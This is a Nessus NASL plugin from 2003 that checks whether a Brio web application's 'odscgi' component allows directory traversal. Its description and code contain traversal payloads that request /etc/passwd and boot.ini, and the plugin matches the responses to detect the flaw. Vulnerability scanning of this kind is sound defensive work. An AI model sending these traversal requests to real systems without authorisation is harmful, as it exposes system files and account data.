#
# This script was written by fr0stman <fr0stman@sun-tzu-security.net>
#
# v. 1.00 (last update 02.09.03)
#
# This script is released under the GPLv2
#

if(description)
{
 script_id(15849);
 script_name(english:"Brio Unix Directory Traversal");
 script_version("$Revision: 1.2 $");

script_description(english:"
The Brio web application interface has a directory traversal 
in the component 'odscgi'. An attacker may exploit this flaw to read
arbitrary files on the remote host by submitting a URL like :

 http://www.example.com/ods-cgi/odscgi?HTMLFile=../../../../../../etc/passwd

Solution: Check www.brio.com for updated software.
Risk Factor: Medium");


 script_summary(english:"Brio Unix Directory Traversal");

 script_category(ACT_GATHER_INFO);

 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2003 Chris Foster");

 script_dependencies("http_version.nasl");
 script_require_keys("Settings/ThoroughTests");

 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');

if ( ! thorough_tests ) exit(0);

port = get_http_port(default:80);
if ( !port ) exit(0);
if(get_port_state(port))
{
rq = "/ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../etc/passwd";
req = http_get(item:rq, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if ( egrep(pattern:"root:.*:0:[01]:", string:res ) )
	security_warning(port);

rq = "/ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../boot.ini";
req = http_get(item:rq, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if ( "[operating systems]" >< res )
	security_warning(port);
}

